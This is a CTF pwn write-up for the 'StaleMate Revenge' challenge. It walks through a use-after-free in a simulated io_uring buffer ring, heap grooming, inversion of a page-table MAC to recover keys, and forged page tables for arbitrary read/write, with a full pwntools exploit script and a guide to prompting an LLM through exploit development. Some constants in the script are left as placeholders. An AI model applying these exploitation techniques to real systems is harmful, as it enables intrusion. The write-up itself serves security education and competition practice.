---
title: "StaleMate Revenge"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: pwn
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, pwn, ai-assisted]
draft: false
summary: "A hardened userland io_uring/PBUF use-after-free where deterministic heap grooming leaks the workspace MAC keys, lets me forge a self-referential page table, and rewrite the sealed record chain into a winning position."
icon: "♟️"
---

## Summary

StaleMate Revenge is the hardened sequel to StaleMate: a stripped, Full-RELRO/NX/canary PIE that simulates a userland io_uring provided-buffer (PBUF) ring on top of a two-level, MAC-protected page table. The win is a five-record "sealed chain" that boots one move from victory, and the road there is a stale-view use-after-free that — once I groom the right page-table page onto the freed slot — leaks the per-workspace MAC keys, lets me forge a self-referential page table for arbitrary read/write, and lets me fix the two deliberately-wrong bitmask fields and re-seal the chain. I drove an LLM through the binary's structure and arithmetic while I supplied the strategy, the grooming insight, and the verification that caught its off-by-`0x20` mistake.

## Solution

I'll be honest about how this solve actually went, because it shaped the whole approach. I did not hand-reverse this binary for ten hours. I recognized the *shape* — "this is the io_uring PBUF UAF family, re-skinned, with crypto bolted on" — and from there the model did the grinding: it read decomp, transcribed the splitmix64 routines, derived the MAC inversion, and emitted pwntools. My job was to keep it aimed at the load-bearing facts, to refuse its plausible-but-wrong detours, and to verify every numeric claim against the live process. That division of labor *is* the writeup, so I'm telling the technique and the steering together.

### Mapping the theme onto the real machinery

The first thing I made the model do was stop reading flavor text as flavor text. The 13-option menu is a costume over two well-known kernel subsystems, and naming them correctly is what makes the rest tractable:

```
pipe        = pbuf ring          (open / mirror / drop = register / mmap / unregister)
workspace   = mm context         shelf = page table       slice = vm read / write
ledger / voucher / record = the sealing machinery + the cred-equivalent
```

```
1. open pipe       2. mirror pipe      3. drop pipe        4. send packet     5. trace packet
6. open workspace  7. attach shelf     8. fetch slice      9. store slice    10. sync ledger
11. stage voucher  12. discard voucher 13. claim record
```

The banner — *"records are sealed until the workspace agrees"* — is a literal spec, not atmosphere: you cannot touch the records until you defeat the workspace's keyed page-table MAC. So the dependency graph is fixed: **leak workspace keys → forge page table → arbitrary slot R/W → rewrite + re-seal records → claim**.

### The win condition: a position one move from won

`claim record` (option 13, `FUN_00103760`) walks a five-record chain anchored at the global `DAT_001060c0`. For the correct boot record-set (`param_3 = 1`) it checks:

```
R1[0x24] == 0x31415927                              ( digits of π )
R2[0x24] == 0x27182818                              ( digits of e )
R3[0x34] == 3                R4[0x1c] == 4
R3[0x20] & 0x40002004081      == 0x40002004081       <-- bitmask field
R5_field & 0x8000000000002491 == 0x8000000000002491  <-- bitmask field
splitmix64( ... R5_field ... ) == R1[0x18]           <-- final binding hash
+ each record's seal must verify  (FUN_001028d0 / 950 / 9d0 / a60 / ad0)
```

Boot builds this chain **almost-winning** — π, e, 3, and 4 are already correct — and deliberately leaves two bitmask fields short:

```
R3[0x20] = 0x40000000081           (needs 0x40002004081     — missing bits 0x2004000)
R5_field = 0x491                   (needs 0x8000000000002491 — missing 0x8000000000002000)
```

That is the literal **stalemate**: a board one legal move from victory but stuck. The objective is small and concrete: set two bitmask fields, then make every seal and the final binding hash agree again.

### Why the seals are a free lunch

This is the single most important early insight, and it's where I had to overrule the model's instinct. The five seal functions *look* like keyed MACs — they're called "seals," they're cryptographic, they hash record fields. The model's first read was "we need to leak a seal key." That's wrong, and believing it would have burned the solve on a key that doesn't exist.

Each seal is a pure `splitmix64` finalizer over the record's fields XORed with **fixed, baked-in constants**. No secret. So once I have an arbitrary write into a record page, I can recompute every valid seal myself. The seals are not a barrier; they're bookkeeping I have to redo after editing a field.

```python
M = (1 << 64) - 1
def rol(x, n): x &= M; return ((x << n) | (x >> (64 - n))) & M
def ror(x, n): x &= M; return ((x >> n) | (x << (64 - n))) & M
def mix(z):                       # splitmix64 finalizer
    z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & M
    z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & M
    return z ^ (z >> 31)

def seal1(R):  # FUN_001028d0
    v = R[0] ^ R[1] ^ rol(R[2], 0x7) ^ rol(R[3], 0x11) ^ R[4] ^ 0xc3a5c85c97cb3127
    return mix(v)
def seal3(R):  # FUN_001029d0
    v = (R[0] ^ R[4] ^ ((R[6] & 0xffffffff) << 32) ^ rol(R[1], 3) ^ rol(R[2], 0xd)
         ^ rol(R[3], 0x17) ^ rol(R[5], 0x1f) ^ ((R[6] >> 32) & 0xffffffff)
         ^ 0x9b2c76a1570c4d35)
    return mix(v)
def seal5(R):  # FUN_00102ad0
    v = R[0] ^ rol(R[1], 0x5) ^ rol(R[2], 0x13) ^ R[3] ^ R[4] ^ 0xb492b66fbe98f273
    return mix(v)
```

So the *cryptography* in this challenge is not what gates the flag. What gates the flag is the **keyed page-table MAC**, which is genuinely secret-keyed — and that's what I have to leak.

### The bug: a stale view

The corruption primitive is the same family as v1, and it's clean:

- `open pipe` allocates a 64-byte slot (a PBUF ring).
- `mirror pipe` creates a *view* over that slot — a second handle aliasing the same backing page.
- `drop pipe` frees the buddy block, but **the view survives**. Classic use-after-free.

With a live view onto freed-then-reused memory:

- **`send packet`** writes 16 controlled bytes into the page → UAF write.
- **`trace packet`** reads 8 bytes back → UAF read / leak.

I confirmed the primitive against the binary before building anything on top of it:

```
open(64-slot) -> mirror -> drop -> send(0xdeadbeef) -> trace  =>  reads back 0xdeadbeef
```

That round-trip is the first verification gate. If `trace` doesn't echo `0xdeadbeef`, nothing downstream is worth attempting, and I told the model in no uncertain terms not to write a line of the page-table forge until this echoed correctly.

### Defeating the sealed workspace — the linchpin

The page table is two-level. Each PTE is a keyed MAC over `(level, index, slot, flags)` using two per-workspace secrets (`ws[0x10]`, `ws[0x18]`). Build is `FUN_00103620`, verify is `FUN_00102dd0`. The decoded form and the MAC are:

```
decoded = slot<<12 | parity<<4 | flags
parity  = splitmix64(index<<5 ^ flags ^ slot<<17 ^ level*4 ^ C3) & 0xff
lo = rol( splitmix64(level<<12 ^ index<<32 ^ C1) + key1 , sh(level,index) ) ^ decoded
hi = ( splitmix64(lo ^ index<<32 ^ level ^ C2) + key2 + decoded ) ^ rol(key1, 0x17)
```

Forging a PTE needs both keys, and the keys are secret. The model's reflex was to brute them; I corrected course, because there's a structural weakness that collapses the whole thing: **the buddy allocator is deterministic.** Allocation/free order is reproducible, so I can engineer which physical slot a freed pipe view aliases. Concretely, I groom so the workspace's *page-table page* lands on the freed pipe slot my view points at (in the simulation: pipe slot `23` → pgtable slot `23`).

Once they alias, recovering the keys is a known-plaintext attack:

1. `attach shelf` writes a *real* level-0 PTE into the page-table page — which is now my view's page.
2. `trace packet` (plus a second read for the high half) **leaks that PTE** as `(lo, hi)`.
3. I know the plaintext exactly: `level=0`, a known `index`, the `slot` it maps, `flags=9`. With `(lo, hi)` and the plaintext, the MAC is invertible because addition and rotation are reversible:

```python
C1, C2, C3 = 0x..., 0x..., 0x...                 # PTE MAC constants from the binary
def sh(level, index): return (index ^ level) & 0x3f
def decoded(level, index, slot, flags):
    parity = mix((index << 5) ^ flags ^ (slot << 17) ^ (level * 4) ^ C3) & 0xff
    return (slot << 12) | (parity << 4) | flags

def encode_pte(level, index, slot, flags, key1, key2):
    d  = decoded(level, index, slot, flags)
    lo = rol((mix((level << 12) ^ (index << 32) ^ C1) + key1) & M, sh(level, index)) ^ d
    hi = ((mix(lo ^ (index << 32) ^ level ^ C2) + key2 + d) ^ rol(key1, 0x17)) & M
    return lo, hi

def recover(level, index, slot, flags, lo, hi):
    d  = decoded(level, index, slot, flags)
    m1 = mix((level << 12) ^ (index << 32) ^ C1)
    m2 = mix(lo ^ (index << 32) ^ level ^ C2)
    key1 = (ror((d ^ lo) & M, sh(level, index)) - m1) & M
    key2 = ((hi ^ rol(key1, 0x17)) - m2 - d) & M
    return key1, key2
```

The verification here is non-negotiable and easy: re-encode the leaked PTE with the recovered `(key1, key2)` and check it reproduces `(lo, hi)` **byte for byte**. It did. That single equality is what proves the entire MAC transcription — every constant, every rotation amount, the parity term — is correct. I made the model pass this assertion before letting it write any forging code.

### Arbitrary page R/W → record surgery

With both keys I can mint any PTE I want. I forge a **self-referential page table** directly into the UAF'd page-table page via `send packet`:

- directory entry `[idx0]` → the page-table slot itself (`flags 9`), so the table maps itself;
- level-1 entry `[idx1]` → a target record slot (`flags 7`, writable).

Now `fetch slice` / `store slice` are arbitrary read and write over any slot.

This is where the challenge's own name bit me, and it's the most instructive dead-end. The level-1 PTEs do **not** live at index `j`; they live at index `0x20 + j`. An early version passed the raw record index `j` to `store slice`. The symptom was maddening and *asymmetric*: **reads worked, writes faulted.** That asymmetry is diagnostic — it means the read and write paths were resolving different indices, i.e. an offset was applied on one side and not the other. The model had confidently emitted `j` in both places and "explained" why that was fine. It cost an hour. The fix is `0x20 + j` for the level-1 slot. *Grooming, not grep* — you cannot string-search past a wrong page-table index; you have to understand the table layout.

The fault budget is a real hazard too: the workspace has a **3-fault auto-lock**, so a faulting `store slice` is not free. Two careless mistakes and the workspace locks, forcing a reconnect (and on remote, re-doing the PoW). That made "verify before you write" not just hygiene but a hard constraint — verify each forged PTE and read back each write before spending the next fault.

### Rewriting the chain and re-sealing

With clean arbitrary write, the endgame is mechanical: set the two bitmask fields, recompute every seal that touches a changed field, and recompute the final binding hash — which depends on the new R5 field, and therefore forces a re-seal of R1. **Order matters:** re-seal R3 and R5 *after* writing their fields, compute `H` from the *new* R5 field, write `H` into R1, then re-seal R1 last. Get the order wrong and a stale seal fails verification even though every value "looks right."

### The end-to-end script

One clear path, challenge data to printed flag. Remote uses the same redpwn kctf PoW as v1, solved before the menu loop.

```python
#!/usr/bin/env python3
# StaleMate Revenge — full solve. Run: python3 full.py REMOTE
from pwn import *

M = (1 << 64) - 1
def rol(x, n): x &= M; return ((x << n) | (x >> (64 - n))) & M
def ror(x, n): x &= M; return ((x >> n) | (x << (64 - n))) & M
def mix(z):                       # splitmix64 finalizer
    z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & M
    z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & M
    return z ^ (z >> 31)

# --- PTE MAC (constants recovered from FUN_00102dd0 / FUN_00103620) ---
C1, C2, C3 = 0x..., 0x..., 0x...
def sh(level, index): return (index ^ level) & 0x3f
def decoded(level, index, slot, flags):
    parity = mix((index << 5) ^ flags ^ (slot << 17) ^ (level * 4) ^ C3) & 0xff
    return (slot << 12) | (parity << 4) | flags
def encode_pte(level, index, slot, flags, k1, k2):
    d  = decoded(level, index, slot, flags)
    lo = rol((mix((level << 12) ^ (index << 32) ^ C1) + k1) & M, sh(level, index)) ^ d
    hi = ((mix(lo ^ (index << 32) ^ level ^ C2) + k2 + d) ^ rol(k1, 0x17)) & M
    return lo, hi
def recover(level, index, slot, flags, lo, hi):
    d  = decoded(level, index, slot, flags)
    m1 = mix((level << 12) ^ (index << 32) ^ C1)
    m2 = mix(lo ^ (index << 32) ^ level ^ C2)
    k1 = (ror((d ^ lo) & M, sh(level, index)) - m1) & M
    k2 = ((hi ^ rol(k1, 0x17)) - m2 - d) & M
    return k1, k2

# --- record seals (pure splitmix64 over fields XOR fixed constants, no secret) ---
def seal1(R):
    return mix(R[0] ^ R[1] ^ rol(R[2], 0x7) ^ rol(R[3], 0x11) ^ R[4] ^ 0xc3a5c85c97cb3127)
def seal3(R):
    v = (R[0] ^ R[4] ^ ((R[6] & 0xffffffff) << 32) ^ rol(R[1], 3) ^ rol(R[2], 0xd)
         ^ rol(R[3], 0x17) ^ rol(R[5], 0x1f) ^ ((R[6] >> 32) & 0xffffffff)
         ^ 0x9b2c76a1570c4d35)
    return mix(v)
def seal5(R):
    return mix(R[0] ^ rol(R[1], 0x5) ^ rol(R[2], 0x13) ^ R[3] ^ R[4] ^ 0xb492b66fbe98f273)

# --- menu wrappers ---
HOST, PORT = "pwn.v1t.site", 31338
io = remote(HOST, PORT) if args.REMOTE else process("./service")

def menu(opt):           io.sendlineafter(b"> ", str(opt).encode())
def open_pipe(slot):     menu(1); io.sendlineafter(b": ", str(slot).encode())
def mirror_pipe():       menu(2)
def drop_pipe():         menu(3)
def send_packet(data):   menu(4); io.send(data.ljust(16, b"\x00"))
def trace_packet():      menu(5); return u64(io.recvn(8))
def open_workspace():    menu(6)
def attach_shelf():      menu(7)
def fetch(slot, off):    menu(8); io.sendlineafter(b": ", f"{slot} {off}".encode()); return u64(io.recvn(8))
def store(slot, off, b): menu(9); io.sendlineafter(b": ", f"{slot} {off}".encode()); io.send(b)
def claim_record():      menu(13); return io.recvall(timeout=2)

# --- 0. prove the UAF primitive before anything else ---
open_workspace()
open_pipe(64); mirror_pipe(); drop_pipe()                 # view survives the free
send_packet(p64(0xdeadbeef))
assert trace_packet() == 0xdeadbeef, "UAF round-trip failed; abort"

# --- 1. groom the workspace page-table page onto the freed slot, leak a real PTE ---
attach_shelf()                                            # pgtable lands on pipe slot 23
PT_SLOT, IDX0 = 23, 0                                     # known cleartext of the leak
lo = trace_packet()
hi = fetch(PT_SLOT, 0x08)                                 # second half of the leaked PTE

# --- 2. invert the MAC to recover both workspace keys (and PROVE it) ---
k1, k2 = recover(0, IDX0, PT_SLOT, 9, lo, hi)
assert encode_pte(0, IDX0, PT_SLOT, 9, k1, k2) == (lo, hi)   # byte-for-byte oracle
log.success(f"k1={k1:#x} k2={k2:#x}")

# --- 3. forge a self-referential page table for arbitrary R/W ---
d_lo, d_hi = encode_pte(0, IDX0, PT_SLOT, 9, k1, k2)      # directory -> itself
send_packet(p64(d_lo) + p64(d_hi))

REC_SLOTS = [...]                                         # 5 record slots, from chain walk
for j, rec_slot in enumerate(REC_SLOTS):                  # level-1 PTEs at index 0x20+j
    l_lo, l_hi = encode_pte(1, 0x20 + j, rec_slot, 7, k1, k2)
    store(PT_SLOT, 0x100 + j * 16, p64(l_lo) + p64(l_hi))

R1_slot, R3_slot, R5_slot = REC_SLOTS[0], REC_SLOTS[2], REC_SLOTS[4]

# --- 4. fix the two stale bitmask fields and re-seal (order matters) ---
r3 = [fetch(R3_slot, 0xa0 + i*8) for i in range(7)]
NR3 = 0x40002004081
store(R3_slot, 0xb0, p64(NR3))
store(R3_slot, 0xc8, p64(seal3([r3[0], r3[1], r3[2], r3[3], NR3, r3[5], r3[6]])))

r5 = [fetch(R5_slot, 0x1d0 + i*8) for i in range(5)]
NR5 = 0x8000000000002491
store(R5_slot, 0x1e0, p64(NR5))
store(R5_slot, 0x1f8, p64(seal5([r5[0], r5[1], r5[2], r5[3], NR5])))

# R1's binding hash depends on the NEW R5 field -> recompute, then re-seal R1 last
l1b0 = fetch(R1_slot, 0x100); l188 = fetch(R1_slot, 0x108)
ld8  = fetch(R1_slot, 0x110); l118 = fetch(R1_slot, 0x118)
l148 = fetch(R1_slot, 0x120)
H = mix((l1b0 << 7) ^ NR5 ^ l188 ^ ld8 ^ rol(l118, 0xf) ^ (l148 << 32)
        ^ 0x43b8d13d98a22104)
store(R1_slot, 0x138, p64(H))
r1 = [fetch(R1_slot, 0x128 + i*8) for i in range(5)]
store(R1_slot, 0x148, p64(seal1([r1[0], r1[1], r1[2], H, r1[4]])))

# --- checkmate ---
print(claim_record().decode(errors="ignore"))            # -> v1t{...}
```

The blanks (`C1`/`C2`/`C3`, `REC_SLOTS`) are read straight out of the binary's MAC and chain-walk routines; they were locked in the moment the `encode_pte(...) == (lo, hi)` assertion passed. That assertion is the linchpin of the entire script — it is what converts "the model transcribed some constants" into "the model transcribed the *right* constants."

## Flag

```
v1t{revenge_requires_grooming_not_grep}
```

## Lessons learned - prompting the AI

This is the section I care about most, because the write-up above makes it look cleaner than it was. The real skill on this challenge was not knowing splitmix64 — the model knows splitmix64 cold. The skill was *prompting it toward the load-bearing facts and refusing its confident-but-wrong detours.* Here is the reusable playbook for this class: a re-skinned kernel-primitive pwn with a homebrew keyed MAC sitting between you and the win.

**1. Force the model to separate "real crypto" from "bookkeeping crypto" first.** The biggest time-saver was making it classify each hash by whether it touches a secret:

> "List every hash/MAC routine in this binary. For each, tell me whether its inputs include a per-session or per-workspace secret, or only record fields XORed with constants baked into the binary. I only care about the ones with a real secret — those are the ones I have to leak. The keyless ones I can just recompute."

That reframed the seals from "five scary MACs" into "five things I recompute after editing a field," and isolated the *one* genuinely-keyed MAC (the PTE) as the only thing worth attacking. Say it explicitly: keyless splitmix-over-constants is not a barrier, do not propose leaking those keys, there is no key.

**2. Anchor every numeric claim to an executable check, and make the model write the check first.** LLMs transcribe rotation amounts and XOR constants wrong constantly, and confidently. The defense is to demand the round-trip:

> "Write `recover()` that inverts the PTE MAC and `encode_pte()` that builds it. Before you trust either, assert `encode_pte(*plaintext, *recover(*plaintext, lo, hi)) == (lo, hi)` on the leaked PTE. Do not write any page-table forging code until that assertion passes. If it fails, the bug is in a constant or a rotation amount, not in my grooming."

The `encode_pte == (lo, hi)` equality is the oracle that proves the whole transcription at once. I caught two wrong constants this way — the model "fixed" them only because the assertion refused to pass, not because it spotted the error itself.

**3. Turn failure *shape* into a constraint, don't just say "it broke."** When writes faulted but reads worked, I did not ask "why doesn't it work." I told the model what the asymmetry meant:

> "Reads succeed, writes fault. That asymmetry means the read and write paths are resolving different page-table indices — one side is applying an offset the other isn't. Find where the level-1 PTE index is computed and show me both the read and write index expressions side by side."

That collapsed a vague failure into the `0x20 + j` vs `j` bug in one step. The general move: convert the *symptom's shape* into a statement about where the bug can live, and hand that to the model. This is "grooming, not grep" in prompt form — the model cannot grep its way to a page-table index error, so make it reason about layout.

**Dead-ends to pre-empt in the prompt:** (a) tell it the seals have no secret so it stops hunting for one; (b) tell it the buddy allocator is deterministic so grooming is reliable and it shouldn't propose spray-and-pray; (c) warn it about the 3-fault auto-lock so it verifies forged PTEs *before* a `store` that could fault and burn a reconnect/PoW; (d) tell it level-1 PTEs are at `0x20 + j`, because it will otherwise default to `j` and rationalize it.

**How I verified / caught mistakes:** three hard gates, in order — the `0xdeadbeef` UAF round-trip (the primitive is real), the `encode_pte == (lo, hi)` re-encode (the MAC transcription is exact), and a read-back of each record field after every `store` (the write landed before I spend the next fault). None of these were optional, and the model was not allowed to skip past any of them.

**Fast-path prompt recipe for next time:** *"Classify each hash by whether it's secret-keyed — attack those, recompute the keyless ones; invert the one keyed MAC and prove it with an encode-equals-leak assertion before forging anything; treat read/write asymmetries as offset bugs and diff the index expressions; and verify every forged PTE before any write, because faults are budgeted."*
